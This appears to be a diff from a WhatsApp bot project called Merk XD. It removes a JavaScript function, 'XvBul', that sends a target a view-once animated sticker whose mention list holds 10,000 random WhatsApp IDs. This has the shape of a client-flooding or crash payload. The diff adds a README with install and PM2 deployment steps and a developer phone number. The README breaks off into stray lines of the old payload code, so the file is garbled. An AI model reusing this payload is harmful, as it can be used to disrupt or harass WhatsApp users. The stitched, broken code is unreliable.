@@ -1,75 +1,117 @@
-async function XvBul(target) {
-  const mediaData = [{
-    ID: "69680D38",
-    uri: "t62.43144-24/10000000_790307790709311_669779370012050552_n.enc?ccb=11-4&oh",
-    buffer: "11-4&oh=01_Q5Aa3QGnIg1qMpL5Isc7LmIdU1IpoFsCqXialsd2OW2w0QQyUw&oe",
-    sid: "5e03e0",
-    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
-    ENCSHA256: "7ovcifxdIivWXIJgLvrRtPfs+pPXen7hoXtnoFKdP4s=",
-    mkey: "Wql96TBHCa44YVS6eAlHGI6aYIYg6yc0kuOr0Y9WvtI="
-  },
-    {
-      ID: "69680D38",
-      uri: "t62.43144-24/10000000_1534257120961824_1506742782412655205_n.enc?ccb=11-4&oh",
-      buffer: "11-4&oh=01_Q5Aa3QEE7wUPnOULMZhlwnOw_bhHK6Gn7YI0hKpVm3yvw5dGMw&oe",
-      sid: "5e03e0",
-      SHA256: "I2ky6mhJmsFYmA+XRBoiaiTeYwnXGQAVXym+P/9YN6Y=",
-      ENCSHA256: "HyfU2MhgxBQFFIohXT68RNZa0MAZRxDYB4X1c3I7JQY=",
-      mkey: "Q5V7iUFs67ewh1qOOkqwQ9avc3u7qXAhyh2fIgVITCU="
-    },
-    {
-      ID: "696C0CE0",
-      uri: "t62.43144-24/10000000_1897784937438799_7647459696855315586_n.enc?ccb=11-4&oh",
-      buffer: "01_Q5Aa3QGNjK1V4UGLF19HxU16vRNPFJQjy64pYSFbsuEm6bySdw&oe",
-      sid: "5e03e0",
-      SHA256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
-      ENCSHA256: "RA4VN83TrKamnTjEolURSU7+2UUDY28EFBBQvFNh7e4=",
-      mkey: "dTMN5/4/mFir4PcfgezcrIXqigJ8pl/COUQMxUsTaac="
-    }];
-  let sequentialIndex = 0;
-  var a = mediaData[sequentialIndex];
-  sequentialIndex = (sequentialIndex + 1) % mediaData.length;
-  var b = a.ID;
-  const e = a.uri,
-  f = a.buffer,
-  g = a.sid,
-  k = a.SHA256,
-  l = a.ENCSHA256;
-  a = a.mkey;
-  let c;
-  c = !1;
+# 🤖 Merk XD
 
-  const msg = {
-    viewOnceMessage: {
-      message: {
-        stickerMessage: {
-          url: `https://mmg.whatsapp.net/v/${e}=${f}=${b}&_nc_sid=${g}&mms3=true`,
-          fileSha256: k,
-          fileEncSha256: l,
-          mediaKey: a,
-          mimetype: "image/webp",
-          directPath: `/v/${e}=${f}=${b}&_nc_sid=${g}`,
-          fileLength: {
-            low: Math.floor(1E3 * Math.random()),
-            high: 0,
-            unsigned: !0
-          },
-          mediaKeyTimestamp: {
-            low: Math.floor(17E8 *
-              Math.random()),
-            high: 0,
-            unsigned: !1
-          },
-          firstFrameLength: 19904,
-          firstFrameSidecar: "KN4kQ5pyABRAgA==",
-          isAnimated: !0,
-          contextInfo: {
-            participant: d,
-            mentionedJid: ["0@s.whatsapp.net",
-              ...Array.from({
-                length: 1E4
-              }, () => "1" + Math.floor(5E6 * Math.random()) + "@s.whatsapp.net")],
-            groupMentions: [],
+A powerful and reliable WhatsApp bot designed to automate tasks, manage groups, and enhance your WhatsApp experience.
+
+## ✨ Features
+
+- ⚡ Fast and responsive
+- 🛡️ Group management tools
+- 🎮 Fun and entertainment commands
+- 🤖 AI-powered features
+- 📥 Media downloading
+- 🔒 Owner-only commands
+- 🚫 Anti-spam system
+- 🔄 24/7 VPS support
+
+## 📋 Requirements
+
+- Node.js v18 or higher
+- Git
+- Ubuntu VPS (Recommended)
+- Stable Internet Connection
+- WhatsApp Account
+
+## 🚀 Installation
+
+### Clone Repository
+
+```bash
+git clone https://github.com/johnmuuo36-debug/Merk.git
+cd Merk
+```
+
+### Install Dependencies
+
+```bash
+npm install
+```
+
+### Start Bot
+
+```bash
+npm start
+```
+
+Or
+
+```bash
+node index.js
+```
+
+## 📱 Pairing
+
+1. Start the bot.
+2. Scan the QR Code or use the Pairing Code method.
+3. Wait for the session to be created.
+4. Enjoy using Merk XD.
+
+## 📖 Main Commands
+
+| Command | Description |
+|----------|------------|
+| .menu | Display all commands |
+| .ping | Check bot speed |
+| .owner | Contact owner |
+| .help | Help menu |
+| .info | Bot information |
+
+## 🔧 VPS Deployment
+
+### Install PM2
+
+```bash
+npm install -g pm2
+```
+
+### Start Bot
+
+```bash
+pm2 start index.js --name "Merk-XD"
+```
+
+### Save Process
+
+```bash
+pm2 save
+pm2 startup
+```
+
+## 👨‍💻 Developer
+
+**JohnTech**
+
+WhatsApp: +254716626709
+
+GitHub: https://github.com/johnmuuo36-debug/Merk.git
+
+## 📜 License
+
+This project is available under the MIT License.
+
+## ⚠ Disclaimer
+
+This bot is intended for automation and productivity purposes. Users are responsible for complying with WhatsApp's Terms of Service and applicable laws.
+
+---
+
+<div align="center">
+
+### 🚀 Merk XD
+#### Fast • Reliable • Powerful
+
+Made with ❤️ by JohnTech
+
+</div>            groupMentions: [],
             entryPointConversionSource: "non_contact",
             entryPointConversionApp: "whatsapp",
             entryPointConversionDelaySeconds: 467593
